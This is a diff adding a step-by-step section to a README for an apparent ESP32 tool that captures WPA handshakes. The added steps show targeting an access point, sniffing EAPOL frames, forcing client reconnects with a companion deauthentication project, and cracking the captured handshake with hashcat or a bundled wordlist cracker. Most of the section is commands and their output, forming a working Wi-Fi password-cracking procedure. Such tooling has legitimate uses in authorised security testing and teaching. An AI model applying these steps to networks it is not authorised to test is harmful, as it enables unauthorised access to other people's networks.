@@ -66,6 +66,102 @@ python3 tools/crack_handshake.py
 # Or: hashcat -m 22000 files/handshake.bin.22000 wordlist.txt
 ```
 
+## Performing the Capture
+
+### Step 1 — Find the target AP
+
+On the laptop, run the helper script while connected to the target:
+
+```bash
+./tools/find_ap_info.sh
+```
+
+Output:
+```
+SSID:       MyNetwork
+BSSID:      46:5C:B8:8B:E3:61
+Channel:    6
+```
+
+Alternatively, use the separate **Deauthentication** project's scanner firmware.
+
+### Step 2 — Configure the ESP32 via serial
+
+Connect via serial monitor (115200 baud) and configure:
+
+```
+set_ssid MyNetwork
+set_bssid 46:5C:B8:8B:E3:61
+set_channel 6
+```
+
+### Step 3 — Start sniffing
+
+```
+start
+```
+
+The ESP32 enters promiscuous mode on channel 6 and waits for EAPOL frames.
+
+### Step 4 — Trigger a handshake
+
+Have a client connect to the target AP (or reconnect if already connected). The serial output shows:
+
+```
+[HS] M1/4 captured  BSSID: 46:5C:B8:8B:E3:61  STA: E0:D4:64:C2:C5:54
+[HS] M2/4 captured  BSSID: 46:5C:B8:8B:E3:61  STA: E0:D4:64:C2:C5:54
+[HS] *** COMPLETE HANDSHAKE (M1+M2) ***
+```
+
+If no client reconnects naturally, use the separate **Deauthentication** project to force a disconnect — the client will immediately reconnect, generating a fresh handshake.
+
+### Step 5 — Save and verify
+
+```
+save
+status
+```
+
+Check that M1 and M2 show "YES".
+
+### Step 6 — Dump to laptop
+
+```
+dump_raw
+```
+
+On the laptop, capture the output:
+
+```bash
+python3 tools/capture_handshake.py /dev/ttyUSB0
+```
+
+### Step 7 — Convert to hashcat format
+
+```bash
+python3 tools/convert_handshake.py files/handshake.bin
+```
+
+Output: `files/handshake.bin.22000`
+
+### Step 8 — Crack the password
+
+```bash
+python3 tools/crack_handshake.py
+```
+
+This runs hashcat or the built-in pure-Python cracker using the wordlists in `tools/wordlists/`. If the password is in the wordlist, you get:
+
+```
+RESULT: Password cracked successfully!
+```
+
+Or with hashcat directly:
+
+```bash
+hashcat -m 22000 files/handshake.bin.22000 tools/wordlists/common.txt
+```
+
 ## Handshake Binary Format (SPIFFS `/handshake.bin`)
 
 ```
